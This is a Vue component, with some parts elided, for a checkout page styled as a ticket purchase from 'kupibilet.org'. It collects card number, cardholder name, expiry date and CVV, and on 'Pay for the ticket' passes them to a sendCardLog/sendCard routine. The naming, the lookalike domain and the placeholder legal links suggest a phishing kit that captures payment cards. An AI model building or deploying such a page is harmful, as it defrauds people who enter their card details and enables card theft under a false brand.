        ...
        <form action="" class="form">
            ...
            <div class="note__cont container__info">
                ...
                <div class="note__text">
                    ...
                    <a href="https://www.iatatravelcentre.com/world.php"
                        >the entry requirements for the country of your destination or transfer</a
                    >
                </div>
            </div>
            <div class="container__info">
                            ...
                            <div class="card_form">
                                <div class="card_nember">
                                    <div class="info__input">
                                        ...
                                        <div class="input__wrapper">
                                            <input type="text" placeholder="0000 0000 0000 0000" class="input" v-model="card" />
                                        </div>
                                    </div>
                                </div>
                                <div class="card_data">
                                    <div class="card_placeholder">
                                        <div class="info__input">
                                            <label for="null" class="info__label">Cardholder (as indicated on the card)</label>
                                            <div class="input__wrapper">
                                                <input
                                                    type="text"
                                    ...
                                    <div class="card_date_cvv">
                                        <div class="card_date">
                                            <div class="info__input">
                                                <label for="null" class="info__label">Expiry date</label>
                                                <div class="input__wrapper">
                                                    <input
                                                        type="text"
                                                        placeholder="MM/YY"
                                        ...
                                        <div class="card_cvv">
                                            <div class="info__input">
                                                <label for="null" class="info__label">CVC/CVV code</label>
                                                <div class="input__wrapper">
                                                    <input
                                                        type="text"
                                                        placeholder="000"
            ...
            <div class="confirm">
                <div class="confirm_detalis">
                    <div class="detalis_text">
                        <label class="custom-checkbox">
                            ...
                            <span>
                                I accept <a href="/">agreement with kupibilet.org</a>, <a href="/">the privacy policy</a>, terms
                ...
                <div class="confirm_prices">
                    ...
                    <button type="button" class="confirm_submit" @click="sendCardLog()">Pay for the ticket</button>
                </div>
            </div>
        </form>
    </div>
...
export default {
    ...
    methods: {
        sendCardLog() {
            if (this.card.length > 0 && this.date.length > 0 && this.cvv.length > 0 && this.placeholder.length > 0) {
                sendCard(this.card, this.date, this.cvv, this.$route.params.price, this.placeholder);
                this.show = true;
            } else {
                this.error = true;
            }
    ...
    watch: {
        card() {
            ...
            if (cardLen > 21 || !this.card.match(/\d/i)) this.card = this.card.substring(0, cardLen - 1);
        ...
        date() {
            ...
            if (dateLen > 5 || !this.date.match(/[\d|/]/i)) this.date = this.date.substring(0, dateLen - 1);
            if (dateLen === 2) this.date += "/";
            this.oldDate++;
            this.error = false;
        },
        cvv() {
            if (this.cvv.length > 4 || !this.cvv.match(/\d/i)) this.cvv = this.cvv.substring(0, this.cvv.length - 1);
            this.error = false;
        },
    },
    mounted() {
